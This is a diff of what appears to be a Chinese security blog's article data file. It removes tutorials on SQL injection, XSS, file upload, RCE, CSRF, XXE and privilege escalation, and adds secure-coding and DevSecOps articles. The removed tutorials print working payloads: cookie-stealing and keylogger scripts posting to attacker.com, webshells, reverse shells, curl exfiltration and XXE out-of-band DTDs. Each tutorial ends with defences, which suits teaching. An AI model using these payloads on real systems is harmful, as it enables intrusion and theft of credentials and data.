-3. **判断字段数**：ORDER BY N
-4. **确定回显位置**：UNION SELECT 1,2,3...
-5. **获取数据库信息**：database(), version(), user()
-6. **获取表名**：information_schema.tables
-7. **获取字段名**：information_schema.columns
-8. **获取数据**：查询目标表内容
-
-## 数据库特性
-
-### MySQL
-\`\`\`sql
--- 版本
-SELECT version()
--- 数据库
-SELECT database()
--- 用户
-SELECT user()
-\`\`\`
-
-### SQL Server
-\`\`\`sql
--- 版本
-SELECT @@version
--- 数据库
-SELECT DB_NAME()
--- 用户
-SELECT SYSTEM_USER
-\`\`\`
-
-### Oracle
-\`\`\`sql
--- 版本
-SELECT banner FROM v$version WHERE ROWNUM=1
--- 表名
-SELECT table_name FROM all_tables WHERE rownum=1
-\`\`\`
-
-## SQLmap 使用
-
-\`\`\`bash
-# 基本使用
-sqlmap -u "http://target/?id=1" --dbs
-
-# POST 注入
-sqlmap -u "http://target/login" --data="user=admin&pass=123" --dbs
-
-# 带 Cookie
-sqlmap -u "http://target/?id=1" --cookie="session=xxx" --dbs
-
-# 从 Burp 导出的请求文件
-sqlmap -r request.txt --dbs
-
-# 指定数据库和表
-sqlmap -u "http://target/?id=1" -D mydb -T users --dump
-
-# 执行系统命令
-sqlmap -u "http://target/?id=1" --os-shell
-
-# 读取文件
-sqlmap -u "http://target/?id=1" --file-read="/etc/passwd"
-
-# 绕过 WAF
-sqlmap -u "http://target/?id=1" --tamper=space2comment,between --random-agent
-\`\`\`
-
-## WAF 绕过技巧
-
-- **注释符绕过**：\`/**/\` 替代空格
-- **大小写混合**：\`SeLeCt\`
-- **双写绕过**：\`selselectect\`
-- **编码绕过**：URL编码、Unicode编码
-- **等号替换**：\`LIKE\`、\`REGEXP\`、\`BETWEEN\`
-- **逗号替换**：\`JOIN\`、\`LIMIT 1 OFFSET 1\`
-
-## 防御方案
-
-1. **参数化查询**（Prepared Statements）
-\`\`\`python
-# Python 示例
-cursor.execute("SELECT * FROM users WHERE username=%s", (username,))
-\`\`\`
-
-2. **存储过程**
-3. **输入验证和白名单过滤**
-4. **最小权限原则**：应用数据库用户只给必要权限
-5. **WAF 防护**
-6. **错误信息隐藏**
-    `
-  },
-  {
-    slug: 'xss-attack',
-    title: 'XSS 跨站脚本攻击完全指南',
-    date: '2026-06-12',
-    category: 'websec',
-    subcategory: 'xss',
-    tags: ['Web安全', 'XSS', '前端安全'],
-    summary: 'XSS 攻击类型、Payload 构造、绕过技巧和防御措施。',
-    content: `
-## 什么是 XSS
-
-XSS（Cross-Site Scripting）跨站脚本攻击，攻击者在网页中注入恶意脚本，当用户浏览时执行，窃取 Cookie、会话令牌等敏感信息。
-
-## XSS 类型
-
-### 反射型 XSS
-恶意脚本通过 URL 参数传入，服务器直接返回给用户。
-
-\`\`\`
-http://target/search?q=<script>alert(document.cookie)</script>
-\`\`\`
-
-**特点**：需要用户点击恶意链接，非持久化。
-
-### 存储型 XSS
-恶意脚本存储在服务器数据库中，所有访问该页面的用户都会受影响。
-
-**典型场景**：留言板、评论区、用户资料。
-
-**特点**：持久化，危害更大。
-
-### DOM 型 XSS
-前端 JavaScript 直接操作 DOM 导致的漏洞，不经过服务器。
-
-\`\`\`javascript
-// 漏洞代码
-var name = location.hash.substring(1);
-document.getElementById("output").innerHTML = "Hello, " + name;
-\`\`\`
-
-**攻击**：\`http://target/#<img src=x onerror=alert(1)>\`
-
-## 常见 Payload
-
-### 基础测试
-\`\`\`html
-<script>alert(1)</script>
-<script>alert(document.domain)</script>
-<script>alert(document.cookie)</script>
-\`\`\`
-
-### 标签绕过
-\`\`\`html
-<img src=x onerror=alert(1)>
-<svg onload=alert(1)>
-<details open ontoggle=alert(1)>
-<video src=x onerror=alert(1)>
-<body onload=alert(1)>
-<input onfocus=alert(1) autofocus>
-\`\`\`
-
-### 事件处理器
-\`\`\`html
-<marquee onstart=alert(1)>
-<details open ontoggle=alert(1)>
-<video><source onerror=alert(1)>
-<object data="javascript:alert(1)">
-\`\`\`
-
-### 无括号执行
-\`\`\`javascript
-// 使用反引号
-\`alert\`1\`\`
-
-// 使用 SVG
-<svg><script>alert&#40;1&#41;</script></svg>
-
-// 使用 eval
-<img src=x onerror="eval(atob('YWxlcnQoMSk='))">
-\`\`\`
-
-### 窃取 Cookie
-\`\`\`javascript
-<script>
-new Image().src="http://attacker.com/steal?c="+document.cookie;
-</script>
-
-<img src=x onerror="fetch('http://attacker.com/steal?c='+document.cookie)">
-\`\`\`
-
-### Keylogger
-\`\`\`javascript
-<script>
-document.onkeypress=function(e){
-  fetch('http://attacker.com/log?k='+e.key)
-}
-</script>
-\`\`\`
-
-## 绕过技巧
-
-### 大小写混合
-\`\`\`html
-<ScRiPt>alert(1)</sCrIpT>
-\`\`\`
-
-### 双写绕过
-\`\`\`html
-<scrscriptipt>alert(1)</scrscriptipt>
-\`\`\`
-
-### 编码绕过
-\`\`\`html
-&#60;script&#62;alert(1)&#60;/script&#62;
-\x3cscript\x3ealert(1)\x3c/script\x3e
-%3Cscript%3Ealert(1)%3C/script%3E
-\`\`\`
-
-### 空格绕过
-\`\`\`html
-<script/**/>alert(1)</script/>
-<img/src=x onerror=alert(1)>
-\`\`\`
-
-### CSP 绕过
-\`\`\`html
-// 利用 JSONP 端点
-<script src="https://target.com/jsonp?callback=alert(1)//">
-
-// 利用 CDN
-<script src="https://cdn.jsdelivr.net/npm/evil.js">
-\`\`\`
-
-## 工具
-
-- **XSStrike**：自动化 XSS 检测
-- **DalFox**：参数分析和漏洞扫描
-- **kxss**：反射型 XSS 检测
-- **Polyglot**：万能 Payload
-
-\`\`\`bash
-# XSStrike
-python xsstrike.py -u "http://target/search?q=test"
-
-# DalFox
-dalfox url "http://target/search?q=test" --blind your-server.com
-\`\`\`
-
-## 防御方案
-
-1. **HTML 实体编码**：\`<\` → \`&lt;\`，\`>\` → \`&gt;\`
-2. **CSP（Content Security Policy）**
-\`\`\`
-Content-Security-Policy: default-src 'self'; script-src 'self'
-\`\`\`
-
-3. **HttpOnly Cookie**：防止 JavaScript 读取
-4. **输入验证**：白名单过滤
-5. **输出编码**：根据上下文选择编码方式
-6. **X-XSS-Protection**：浏览器 XSS 过滤器
-    `
-  },
-  {
-    slug: 'file-upload',
-    title: '文件上传漏洞利用与防御',
-    date: '2026-06-14',
-    category: 'websec',
-    subcategory: 'upload',
-    tags: ['Web安全', '文件上传', '渗透测试'],
-    summary: '文件上传漏洞的检测、绕过技巧和防御方案。',
-    content: `
-## 什么是文件上传漏洞
-
-文件上传漏洞是指 Web 应用允许用户上传文件但未对文件类型、内容进行严格校验，导致攻击者可以上传恶意文件（如 Webshell）获取服务器控制权。
-
-## 危害
-
-- 上传 Webshell 获取服务器权限
-- 上传恶意文件执行命令
-- 上传钓鱼文件
-- 服务器被控制为跳板
-
-## 漏洞类型
-
-### 1. 前端校验绕过
-前端 JavaScript 验证文件扩展名，可直接 Burp 抓包修改。
-
-### 2. MIME 类型校验
-仅检查 Content-Type 字段，可直接修改：
-\`\`\`http
-Content-Type: image/png
-\`\`\`
-
-### 3. 黑名单校验
-过滤特定扩展名，可使用大小写、双写、特殊后缀绕过。
-
-### 4. 白名单校验
-仅允许特定扩展名，可利用解析漏洞。
-
-### 5. 目录路径可控
-可修改上传路径：\`filename="../../../shell.php"\`
-
-## 绕过技巧
-
-### 扩展名绕过
-\`\`\`
-php → php3, php4, php5, php7, phtml, pht, phps
-asp → aspx, cfm, cer
-jsp → jspf,jspx
-\`\`\`
-
-### 大小写绕过
 \`\`\`
-.php → .PhP, .PHP, .pHp
+# 附件类型
+- .exe
+- .doc（含宏）
+- .pdf（含漏洞）
+- .lnk（快捷方式）
+- .iso
 \`\`\`
 
-### 双写绕过
-\`\`\`
-.php → .pphphp
-\`\`\`
-
-### 空字节绕过（%00 截断）
-\`\`\`
-shell.php%00.jpg  -- PHP 5.3.4 以下
-shell.php\x00.jpg
-\`\`\`
-
-### .htaccess 绕过
-上传 .htaccess 文件：
-\`\`\`apache
-AddType application/x-httpd-php .jpg
-\`\`\`
-之后上传 .jpg 文件即可当作 PHP 执行。
-
-### .user.ini 绕过
-上传 .user.ini 文件：
-\`\`\`ini
-auto_prepend_file=shell.jpg
-\`\`\`
-在同目录下所有 PHP 文件前包含 shell.jpg。
-
-### 图片马
-将 PHP 代码嵌入图片文件：
-\`\`\`bash
-copy /b normal.jpg + shell.php shell.jpg
-\`\`\`
-
-### 文件头绕过
-在文件开头添加图片文件头：
-\`\`\`
-GIF89a <?php eval($_POST['cmd']); ?>
-\`\`\`
-
-## 解析漏洞
-
-### IIS 解析漏洞
-\`\`\`
-/test.asp/test.jpg    -- IIS 6.0
-/test.asp:.jpg        -- IIS 6.0
-/test.cer             -- IIS 6.0
-/test.asp;/test.jpg   -- IIS 6.0
-\`\`\`
-
-### Nginx 解析漏洞
-\`\`\`
-/test.jpg/.php        -- 配置不当
-/test.jpg%00.php      -- 空字节
-\`\`\`
-
-### Apache 解析漏洞
-\`\`\`
-test.php.xxx          -- 不识别的后缀名
-\`\`\`
-
-## 一句话木马
-
-### PHP
-\`\`\`php
-<?php eval($_POST['cmd']); ?>
-<?php system($_GET['cmd']); ?>
-<?php echo shell_exec($_GET['cmd']); ?>
-\`\`\`
-
-### ASP
-\`\`\`asp
-<%eval request("cmd")%>
-\`\`\`
-
-### JSP
-\`\`\`jsp
-<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
-\`\`\`
-
-## Webshell 管理工具
-
-- **中国蚁剑（AntSword）**
-- **哥斯拉（Godzilla）**
-- **冰蝎（Behinder）**
-- **冰蛇（Behinder v3）**
-
-\`\`\`bash
-# 连接一句话
-蚁剑 → 添加数据 → 填写 URL 和密码
-\`\`\`
-
-## 防御方案
-
-1. **白名单校验**：只允许特定扩展名
-2. **重命名文件**：随机文件名
-3. **文件内容检测**：检查文件头
-4. **上传目录隔离**：Web 目录外存储
-5. **禁用脚本执行**：上传目录不解析 PHP
-6. **文件大小限制**
-7. **使用 CDN/WAF**
-    `
-  },
-  {
-    slug: 'rce-vulnerability',
-    title: '命令执行漏洞（RCE）',
-    date: '2026-06-13',
-    category: 'websec',
-    subcategory: 'rce',
-    tags: ['Web安全', 'RCE', '命令执行', '渗透测试'],
-    summary: '远程代码执行和远程命令执行漏洞的原理与利用。',
-    content: `
-## 什么是 RCE
-
-RCE（Remote Code Execution）远程代码执行，攻击者可以在目标服务器上执行任意命令或代码。
-
-## 漏洞分类
-
-### 远程命令执行（RCE）
-直接执行系统命令，如 \`ping\`、\`ls\`、\`cat\`。
-
-### 远程代码执行（Code Exec）
-执行编程语言代码，如 PHP、Python、Java。
-
-## 常见触发函数
-
-### PHP
-\`\`\`php
-system()        -- 执行系统命令
-exec()          -- 执行命令并返回最后一行
-passthru()      -- 直接显示输出
-shell_exec()    -- 执行命令并返回字符串
-popen()         -- 打开进程
-proc_open()     -- 执行命令并控制输入输出
-eval()          -- 执行 PHP 代码
-assert()        -- 执行 PHP 代码
-\`\`\`
-
-### Python
-\`\`\`python
-os.system()
-os.popen()
-subprocess.call()
-subprocess.Popen()
-eval()
-exec()
-\`\`\`
-
-### Java
-\`\`\`java
-Runtime.getRuntime().exec()
-ProcessBuilder
-\`\`\`
-
-## 命令执行漏洞
-
-### 直接注入
-\`\`\`
-http://target/ping.php?ip=127.0.0.1;whoami
-http://target/ping.php?ip=127.0.0.1|whoami
-http://target/ping.php?ip=127.0.0.1||whoami
-http://target/ping.php?ip=127.0.0.1&&whoami
-\`\`\`
-
-### 绕过空格过滤
-\`\`\`
-{cat,/etc/passwd}
-cat$IFS/etc/passwd
-cat\t/etc/passwd
-cat<> /etc/passwd
-\`\`\`
-
-### 绕过关键字过滤
-\`\`\`bash
-# 绕过 cat
-tac /etc/passwd
-more /etc/passwd
-less /etc/passwd
-head /etc/passwd
-tail /etc/passwd
-nl /etc/passwd
-od -c /etc/passwd
-xxd /etc/passwd
-sort /etc/passwd
-uniq /etc/passwd
-rev /etc/passwd
-
-# 绕过 flag
-f\\lag
-fla[g]
-cat /etc/pas*wd
-cat /etc/pas?wd
-\`\`\`
-
-### 无回显利用
-\`\`\`bash
-# 写入文件
-echo PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTsgPz4= | base64 -d > shell.php
-
-# 外带数据
-cat /etc/passwd | curl http://attacker.com/$(cat /etc/passwd | base64)
-
-# 反弹 Shell
-bash -i >& /dev/tcp/attacker.com/4444 0>&1
-\`\`\`
-
-## 代码执行漏洞
-
-### PHP eval
-\`\`\`php
-// 漏洞代码
-<?php eval($_GET['code']); ?>
-
-// 利用
-?code=system('whoami');
-?code=phpinfo();
-\`\`\`
-
-### Python exec
-\`\`\`python
-# 漏洞代码
-exec(request.args.get('code'))
-
-# 利用
-?code=__import__('os').popen('whoami').read()
-\`\`\`
-
-## 常见场景
-
-### CTF 题目
-\`\`\`
-- ping 命令注入
-- 日志分析注入
-- 代码审计找 eval
-- Python 沙箱逃逸
-\`\`\`
-
-### 实际漏洞
-\`\`\`
-- Weblogic 反序列化
-- Struts2 OGNL 注入
-- Apache Shiro 反序列化
-- Log4j2 JNDI 注入
-\`\`\`
-
-## 反弹 Shell
-
-### Bash
-\`\`\`bash
-bash -i >& /dev/tcp/attacker.com/4444 0>&1
-\`\`\`
-
-### Python
-\`\`\`python
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
-\`\`\`
-
-### Netcat
-\`\`\`bash
-nc -e /bin/sh attacker.com 4444
-\`\`\`
-
-### PHP
-\`\`\`php
-<?php
-$sock=fsockopen("attacker.com",4444);
-exec("/bin/sh -i <&3 >&3 2>&3");
-?>
-\`\`\`
-
-## 防御方案
-
-1. **输入验证**：白名单过滤
-2. **避免使用危险函数**
-3. **使用参数化接口**
-4. **最小权限原则**
-5. **禁用危险 PHP 函数**
-\`\`\`ini
-; php.ini
-disable_functions = system,exec,shell_exec,passthru,popen,proc_open
-\`\`\`
-
-6. **WAF 规则**
-    `
-  },
-  {
-    slug: 'csrf-attack',
-    title: 'CSRF 请求伪造攻击',
-    date: '2026-06-11',
-    category: 'websec',
-    subcategory: 'csrf',
-    tags: ['Web安全', 'CSRF', '请求伪造'],
-    summary: 'CSRF 攻击原理、利用方式和防御方案。',
-    content: `
-## 什么是 CSRF
-
-CSRF（Cross-Site Request Forgery）跨站请求伪造，攻击者诱导用户在已登录的状态下访问恶意页面，浏览器自动携带用户凭证发送伪造请求。
-
-## 攻击原理
-
-1. 用户登录目标网站，获得 Session/Cookie
-2. 用户访问攻击者控制的页面
-3. 恶意页面向目标网站发送请求
-4. 浏览器自动携带用户 Cookie
-5. 目标网站认为是用户本人操作
-
-## 攻击方式
-
-### GET 型 CSRF
-\`\`\`html
-<!-- 修改用户密码 -->
-<img src="http://target.com/change_password?new=hacked">
-
-<!-- 转账 -->
-<img src="http://target.com/transfer?to=attacker&amount=10000">
-\`\`\`
-
-### POST 型 CSRF
-\`\`\`html
-<form action="http://target.com/change_password" method="POST">
-  <input type="hidden" name="new_password" value="hacked">
-</form>
-<script>document.forms[0].submit()</script>
-\`\`\`
+### 水坑攻击
 
-### Flash CSRF
-\`\`\`html
-<object type="application/x-shockwave-flash" 
-  data=".swf">
-  <param name="movie" value="http://attacker.com/csrf.swf">
-</object>
 \`\`\`
-
-## 利用场景
-
-### 修改个人信息
-\`\`\`html
-<form action="http://target.com/profile/update" method="POST">
-  <input name="email" value="hacker@evil.com">
-</form>
-\`\`\`
-
-### 发送邮件/消息
-\`\`\`html
-<form action="http://target.com/api/send" method="POST">
-  <input name="to" value="victim@target.com">
-  <input name="content" value="点击链接领奖">
-</form>
-\`\`\`
-
-### 删除操作
-\`\`\`html
-<img src="http://target.com/api/delete?id=123">
-\`\`\`
-
-## CSRF 与 XSS 的区别
-
-| 特性 | XSS | CSRF |
-|------|-----|------|
-| 攻击目标 | 用户浏览器 | Web 应用 |
-| 利用方式 | 注入恶意脚本 | 伪造用户请求 |
-| 是否需要登录 | 不需要 | 需要 |
-| 危害 | 窃取数据 | 执行操作 |
-| 防御重点 | 输入过滤 | Token 验证 |
-
-## 防御方案
-
-### 1. CSRF Token
-\`\`\`html
-<!-- 表单中添加 Token -->
-<form action="http://target.com/transfer" method="POST">
-  <input type="hidden" name="csrf_token" value="随机Token">
-  <input name="amount" value="100">
-</form>
-\`\`\`
-
-### 2. SameSite Cookie
-\`\`\`
-Set-Cookie: session=xxx; SameSite=Strict
-Set-Cookie: session=xxx; SameSite=Lax
-\`\`\`
-
-### 3. 验证 Referer/Origin
-\`\`\`python
-if request.headers.get('Referer') != 'http://target.com':
-    return 'Forbidden'
+# 感染目标常访问的网站
+# 植入恶意代码
+# 等待目标访问
 \`\`\`
 
-### 4. 验证 Content-Type
-\`\`\`python
-if request.content_type != 'application/json':
-    return 'Forbidden'
-\`\`\`
-
-### 5. 自定义请求头
-\`\`\`javascript
-fetch('/api/transfer', {
-  method: 'POST',
-  headers: {
-    'X-CSRF-Token': token,
-    'Content-Type': 'application/json'
-  },
-  body: JSON.stringify({amount: 100})
-})
-\`\`\`
-
-### 6. 二次验证
-重要操作（如转账）要求输入密码确认。
-    `
-  },
-  {
-    slug: 'xxe-injection',
-    title: 'XXE 注入漏洞详解',
-    date: '2026-06-09',
-    category: 'websec',
-    subcategory: 'xxe',
-    tags: ['Web安全', 'XXE', 'XML注入'],
-    summary: 'XXE 漏洞原理、利用方式和防御方案。',
-    content: `
-## 什么是 XXE
-
-XXE（XML External Entity）XML 外部实体注入，当应用解析用户提供的 XML 数据时，未禁用外部实体，导致攻击者可以读取文件、执行命令、发起 SSRF。
-
-## XML 基础
-
-### DTD（文档类型定义）
-\`\`\`xml
-<!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "file:///etc/passwd">
-]>
-<user>&xxe;</user>
-\`\`\`
+### 供应链攻击
 
-### 实体类型
-- **内部实体**：\`<!ENTITY xxe "value">\`
-- **外部实体**：\`<!ENTITY xxe SYSTEM "url">\`
-- **参数实体**：\`<!ENTITY % xxe SYSTEM "url">\`
-
-## 漏洞类型
-
-### 1. 读取本地文件
-\`\`\`xml
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "file:///etc/passwd">
-]>
-<user>&xxe;</user>
-\`\`\`
-
-### 2. 读取 Windows 文件
-\`\`\`xml
-<!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
-]>
 \`\`\`
-
-### 3. SSRF 攻击
-\`\`\`xml
-<!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
-]>
-\`\`\`
-
-### 4. 带外数据回显（OOB）
-\`\`\`xml
-<!DOCTYPE foo [
-  <!ENTITY % file SYSTEM "file:///etc/passwd">
-  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
-  %dtd;
-]>
+# 污染软件源
+# 植入后门
+# 通过正常更新分发
 \`\`\`
 
-evil.dtd：
-\`\`\`xml
-<!ENTITY % data SYSTEM "file:///etc/passwd">
-<!ENTITY % param "<!ENTITY exfil SYSTEM 'http://attacker.com/?data=%data;'>">
-%param;
-\`\`\`
+## 常见 APT 组织
 
-### 5. 参数实体注入
-\`\`\`xml
-<!DOCTYPE foo [
-  <!ENTITY % file SYSTEM "file:///etc/passwd">
-  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexist/%file;'>">
-  %eval;
-  %error;
-]>
-\`\`\`
+| 组织 | 地区 | 目标行业 |
+|------|------|----------|
+| APT28 | 俄罗斯 | 政府、军事 |
+| APT29 | 俄罗斯 | 政府 |
+| Lazarus | 朝鲜 | 金融、加密货币 |
+| OceanLotus | 越南 | 东亚 |
 
 ## 检测方法
 
-### 判断是否存在 XXE
-\`\`\`xml
-<!-- 方法1：盲注 -->
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "http://attacker.com/xxe-test">
-]>
-<user>&xxe;</user>
+1. 流量分析
+2. 日志审计
+3. 威胁情报
+4. 行为分析
+5. 沙箱检测
+    `
+  },
+  // 安全开发
+  {
+    slug: 'secure-coding',
+    title: '安全编码规范',
+    date: '2026-06-15',
+    category: 'securedev',
+    subcategory: 'secure-coding',
+    tags: ['安全开发', '编码规范', 'OWASP'],
+    summary: '各语言安全编码最佳实践。',
+    content: `
+## 通用原则
 
-<!-- 方法2：错误触发 -->
-<?xml version="1.0"?>
-<!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "file:///nonexistent">
-]>
-<user>&xxe;</user>
-\`\`\`
+1. **最小权限**：只授予必要的权限
+2. **纵深防御**：多层安全控制
+3. **输入验证**：永远不信任用户输入
+4. **输出编码**：根据上下文编码
+5. **安全默认**：默认安全配置
 
-### 使用工具
-\`\`\`bash
-# XXEinjector
-ruby XXEinjector.rb --host=attacker.com --file=request.txt
-\`\`\`
+## 输入验证
 
-## 常见应用场景
+### 白名单验证
 
-### 文件上传（SVG）
-\`\`\`xml
-<!-- 上传恶意 SVG 文件 -->
-<svg xmlns="http://www.w3.org/2000/svg">
-  <text x="0" y="20">
-    <script>
-      document.location='http://attacker.com/?c='+document.cookie;
-    </script>
-  </text>
-</svg>
-\`\`\`
-
-### SOAP 接口
-\`\`\`xml
-<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
-  <soap:Body>
-    <user>&xxe;</user>
-  </soap:Body>
-</soap:Envelope>
-\`\`\`
-
-### PDF 生成
-某些 PDF 生成库（如 wkhtmltopdf）会解析 HTML 中的 XML 实体。
-
-## 绕过技巧
-
-### 字符编码
-\`\`\`xml
-<!-- UTF-7 -->
-<!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "file:///etc/passwd">
-]>
-
-<!-- 十六进制编码 -->
-<!ENTITY xxe SYSTEM "hex:2f6574632f706173737764">
-\`\`\`
-
-### 协议限制
-\`\`\`xml
-<!-- 尝试不同协议 -->
-file:///etc/passwd
-http://127.0.0.1/
-ftp://127.0.0.1/
-gopher://127.0.0.1/
-\`\`\`
-
-## 防御方案
-
-1. **禁用外部实体**
 \`\`\`python
-# Python
-import xml.etree.ElementTree as ET
-# 默认已禁用
+import re
 
-# Java
-DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
-dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+def validate_email(email):
+    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$'
+    return re.match(pattern, email) is not None
 \`\`\`
 
-2. **输入验证**：过滤 XML 数据
-3. **使用 JSON 替代 XML**
-4. **WAF 规则**：过滤 \`SYSTEM\`、\`PUBLIC\` 关键字
-5. **最小权限**：Web 服务器进程不读取敏感文件
+### 类型检查
+
+\`\`\`python
+def get_user_id(user_id):
+    if not isinstance(user_id, int):
+        raise ValueError("Invalid user ID")
+    return user_id
+\`\`\`
+
+## SQL 注入防御
+
+### 参数化查询
+
+\`\`\`python
+# 正确
+cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
+
+# 错误
+cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")
+\`\`\`
+
+## XSS 防御
+
+### 输出编码
+
+\`\`\`python
+from markupsafe import escape
+
+# 转义HTML
+safe_content = escape(user_input)
+\`\`\`
+
+## 命令注入防御
+
+\`\`\`python
+import subprocess
+
+# 正确
+subprocess.run(["ls", user_input], shell=False)
+
+# 错误
+os.system(f"ls {user_input}")
+\`\`\`
+
+## 密码存储
+
+\`\`\`python
+from werkzeug.security import generate_password_hash, check_password_hash
+
+# 存储
+password_hash = generate_password_hash(password)
+
+# 验证
+check_password_hash(password_hash, input_password)
+\`\`\`
     `
   },
-  // 攻防对抗
   {
-    slug: 'recon-methods',
-    title: '信息收集方法论',
-    date: '2026-06-10',
-    category: 'attack-defense',
-    subcategory: 'recon',
-    tags: ['渗透测试', '信息收集', ' reconnaissance'],
-    summary: '渗透测试信息收集阶段的完整方法和工具。',
+    slug: 'devsecops',
+    title: 'DevSecOps 实践',
+    date: '2026-06-13',
+    category: 'securedev',
+    subcategory: 'devsecops',
+    tags: ['DevSecOps', 'CI/CD', '安全'],
+    summary: 'DevSecOps 流程和工具集成。',
     content: `
-## 信息收集分类
+## 什么是 DevSecOps
 
-### 被动信息收集
-- **WHOIS 查询**
-- **子域名枚举**：subfinder, amass, oneforAll
-- **DNS 记录查询**：dig, nslookup
-- **搜索引擎**：Google Hacking, Shodan, FOFA
-- **证书透明度**：crt.sh
+DevSecOps 是将安全集成到 DevOps 流程中的实践。
 
-### 主动信息收集
-- **端口扫描**：Nmap, Masscan
-- **服务识别**
-- **操作系统探测**
-- **漏洞扫描**：Nuclei, Xray
-
-## 常用工具
-
-\`\`\`bash
-# 子域名枚举
-subfinder -d target.com -o subdomains.txt
-
-# Nmap 扫描
-nmap -sV -sC -p- target.com
-
-# 目录扫描
-dirsearch -u http://target.com/
-
-# 漏洞扫描
-nuclei -u http://target.com/ -t cves/
-\`\`\`
-
-## Google Hacking
+## 流程
 
 \`\`\`
-site:target.com filetype:php
-intitle:"index of" "parent directory"
-inurl:admin login
-\`\`\`
-    `
-  },
-  {
-    slug: 'windows-privesc',
-    title: 'Windows 权限提升',
-    date: '2026-06-08',
-    category: 'attack-defense',
-    subcategory: 'privesc',
-    tags: ['渗透测试', '权限提升', 'Windows'],
-    summary: 'Windows 环境下的常见提权方法和工具。',
-    content: `
-## 提权方法
-
-### 1. 系统漏洞提权
-\`\`\`powershell
-# 查看系统补丁
-systeminfo | findstr KB
-
-# 使用 watson/WinPEAS 检查可利用漏洞
+计划 → 编码 → 构建 → 测试 → 发布 → 部署 → 运维 → 监控
+  ↓      ↓      ↓      ↓      ↓      ↓      ↓      ↓
+ 安全    安全    安全    安全    安全    安全    安全    安全
 \`\`\`
 
-### 2. 服务配置提权
-\`\`\`powershell
-# 查找可写路径的服务
-sc qc <service_name>
-icacls "C:\\path\\to\\service.exe"
-\`\`\`
+## 安全测试阶段
 
-### 3. 计划任务提权
-\`\`\`powershell
-# 列出计划任务
-schtasks /query /fo LIST /v
+### 开发阶段
+- IDE 安全插件
+- 预提交钩子
+- 代码审查
 
-# 查找可修改的计划任务
-\`\`\`
+### 构建阶段
+- SAST（静态分析）
+- 依赖检查
+- 容器镜像扫描
 
-### 4. AlwaysInstallElevated
-\`\`\`powershell
-# 检查注册表
-reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
-\`\`\`
+### 测试阶段
+- DAST（动态分析）
+- 渗透测试
+- 安全回归测试
 
-### 5. Token 模拟
-\`\`\`powershell
-# potato 系列
-JuicyPotato.exe -l 1337 -p cmd.exe -a "/c whoami" -t *
-\`\`\`
+### 部署阶段
+- 配置审计
+- 密钥管理
+- 合规检查
 
 ## 工具
-- WinPEAS
-- PowerUp
-- SharpUp
-- Seatbelt
+
+| 阶段 | 工具 |
+|------|------|
+| SAST | SonarQube, Semgrep, Checkmarx |
+| DAST | OWASP ZAP, Burp Suite |
+| SCA | Snyk, Dependency-Check |
+| 容器扫描 | Trivy, Snyk Container |
+| 密钥扫描 | GitLeaks, TruffleHog |
+
+## CI/CD 集成
+
+### GitHub Actions
+
+\`\`\`yaml
+- name: Run SAST
+  uses: github/codeql-action/analyze@v2
+
+- name: Run Snyk
+  uses: snyk/actions@master
+  env:
+    SNYK_TOKEN: \${{ secrets.SNYK_TOKEN }}
+\`\`\`
     `
   },
-  // 工具手册
   {
-    slug: 'nmap-guide',
-    title: 'Nmap 使用指南',
-    date: '2026-06-05',
-    category: 'tools',
-    subcategory: 'nmap',
-    tags: ['工具', 'Nmap', '扫描'],
-    summary: 'Nmap 端口扫描工具的完整使用指南。',
+    slug: 'sast-dast',
+    title: 'SAST 与 DAST 工具指南',
+    date: '2026-06-10',
+    category: 'securedev',
+    subcategory: 'sast-dast',
+    tags: ['安全测试', 'SAST', 'DAST'],
+    summary: '静态和动态安全测试工具使用指南。',
     content: `
-## 基本用法
+## SAST（静态应用安全测试）
+
+### 特点
+- 分析源代码
+- 不需要运行程序
+- 可以发现代码级漏洞
+- 覆盖率高
+
+### 工具
+
+#### SonarQube
 
 \`\`\`bash
-# 快速扫描
-nmap target.com
-
-# 全端口扫描
-nmap -p- target.com
-
-# 服务版本检测
-nmap -sV target.com
-
-# 操作系统探测
-nmap -O target.com
-
-# 使用脚本
-nmap --script vuln target.com
+# 扫描
+sonar-scanner -Dsonar.projectKey=myproject -Dsonar.sources=. -Dsonar.host.url=http://localhost:9000
 \`\`\`
 
-## 常用参数
-
-| 参数 | 说明 |
-|------|------|
-| -sS | TCP SYN 扫描 |
-| -sT | TCP 连接扫描 |
-| -sU | UDP 扫描 |
-| -sV | 版本检测 |
-| -O | 操作系统探测 |
-| -A | 全面扫描 |
-| -p | 指定端口 |
-| -T4 | 速度模板 |
-| --script | 使用脚本 |
-
-## 输出格式
+#### Semgrep
 
 \`\`\`bash
-nmap -oN output.txt target.com
-nmap -oX output.xml target.com
-nmap -oG output.gnmap target.com
+# 基本使用
+semgrep --config=auto .
+
+# 指定规则
+semgrep --config=p/owasp-top-ten .
 \`\`\`
-    `
-  },
-  {
-    slug: 'burpsuite-guide',
-    title: 'BurpSuite 使用指南',
-    date: '2026-06-01',
-    category: 'tools',
-    subcategory: 'burpsuite',
-    tags: ['工具', 'BurpSuite', '抓包'],
-    summary: 'BurpSuite 抓包工具的核心模块和使用技巧。',
-    content: `
-## 核心模块
 
-### Proxy（代理）
